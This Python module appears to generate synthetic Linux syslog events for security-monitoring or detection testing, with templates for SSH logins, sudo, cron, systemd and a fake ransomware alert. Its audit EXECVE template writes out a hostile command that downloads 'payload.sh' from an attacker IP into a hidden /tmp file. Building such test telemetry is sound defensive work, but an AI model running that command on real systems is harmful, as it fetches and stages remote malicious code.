from __future__ import annotations

import random
import time
from datetime import datetime
from typing import Any, Optional

from app.core.scenario_inventory import InventoryStore, inventory_store
from app.sources.base import BuiltEvent, EventTypeSpec, Framing


def _bsd_ts() -> str:
    return datetime.now().strftime("%b %d %H:%M:%S")


class LinuxSource:
    id = "linux"
    label = "Linux syslog"
    framing: Framing = "bsd"
    pri_default = "<134>"
    os_family = "linux"

    def list_event_types(self) -> list[EventTypeSpec]:
        return [
            EventTypeSpec("sshd_failed", "sshd failed password", {"host_id": "string", "src_ip": "string?"}),
            EventTypeSpec("sshd_accepted", "sshd accepted key", {"host_id": "string", "user_id": "string", "src_ip": "string?"}),
            EventTypeSpec("sudo", "sudo escalation", {"host_id": "string", "user_id": "string"}),
            EventTypeSpec("audit_execve", "audit EXECVE", {"host_id": "string", "user_id": "string"}),
            EventTypeSpec("cron", "cron job", {"host_id": "string"}),
            EventTypeSpec("systemd_service", "systemd unit", {"host_id": "string"}),
            EventTypeSpec("kernel_ransom_like", "kernel synthetic ransomware-like", {"host_id": "string", "user_id": "string?"}),
            EventTypeSpec("baseline_cron", "baseline cron", {"host_id": "string"}),
            EventTypeSpec("baseline_systemd", "baseline systemd", {"host_id": "string"}),
        ]

    def _host(self, store: InventoryStore, params: dict[str, Any]):
        hid = params.get("host_id")
        hosts = [h for h in store.list_hosts() if h.os_family == "linux"]
        by_id = {h.id: h for h in hosts}
        h = by_id.get(hid or "") or (hosts[0] if hosts else None)
        if not h:
            raise ValueError("Need at least one linux host in inventory")
        return h

    def _user_sam(self, store: InventoryStore, params: dict[str, Any]) -> str:
        uid = params.get("user_id")
        users = store.list_users()
        by_id = {u.id: u for u in users}
        u = by_id.get(uid or "") or (users[0] if users else None)
        return u.sam if u else "monitoring"

    def _src_ip(self, store: InventoryStore, params: dict[str, Any]) -> str:
        if params.get("src_ip"):
            return str(params["src_ip"])
        for c in store.list_c2():
            if c.role == "attacker" and c.ip:
                return c.ip
        return "185.231.88.45"

    def build_event(self, *, event_type: str, params: dict[str, Any], inventory: Optional[InventoryStore] = None) -> BuiltEvent:
        store = inventory or inventory_store
        h = self._host(store, params)
        reporting_ip = h.resolved_reporting_ip()
        hostname = h.hostname
        user = self._user_sam(store, params)
        src = self._src_ip(store, params)
        pri = params.get("pri", self.pri_default)

        if event_type == "sshd_failed":
            msg = (
                f"sshd[{random.randint(1000,9999)}]: Failed password for invalid user admin "
                f"from {src} port {random.randint(40000,65000)} ssh2"
            )
        elif event_type == "sshd_accepted":
            msg = f"sshd[{random.randint(1000,9999)}]: Accepted publickey for {user} from {src} port {random.randint(40000,65000)} ssh2"
        elif event_type == "sudo":
            msg = f"sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/id"
        elif event_type == "audit_execve":
            msg = (
                f'audit: type=EXECVE msg=audit({int(time.time())}.{random.randint(100,999)}:{random.randint(1000,9999)}): '
                f'argc=3 a0="/bin/bash" a1="-c" a2="curl http://{src}/payload.sh -o /tmp/.sysupdate" '
                f'auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm="bash" exe="/bin/bash" key="exec" user="{user}"'
            )
        elif event_type == "cron":
            msg = f"CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/lib/sa/sa1 1 1)"
        elif event_type == "systemd_service":
            msg = "systemd[1]: Started Daily apt download activities."
        elif event_type == "kernel_ransom_like":
            msg = (
                f'kernel: audit: ransomware-like file activity detected '
                f"path=/srv/finance filename=finance_backup.xlsx.encrypted user={user} "
                f'srcip={src} msg="Synthetic OT telemetry anomaly"'
            )
        elif event_type == "baseline_cron":
            msg = f"CRON[{random.randint(1000,9999)}]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)"
        elif event_type == "baseline_systemd":
            msg = f"systemd[1]: Started Session {random.randint(1000,9999)} of user root."
        else:
            raise ValueError(f"Unknown linux event_type {event_type}")

        raw = f"{pri}{_bsd_ts()} {hostname} {msg}"
        return BuiltEvent(reporting_ip=reporting_ip, hostname=hostname, payload=raw, pri=str(pri), framing=self.framing)
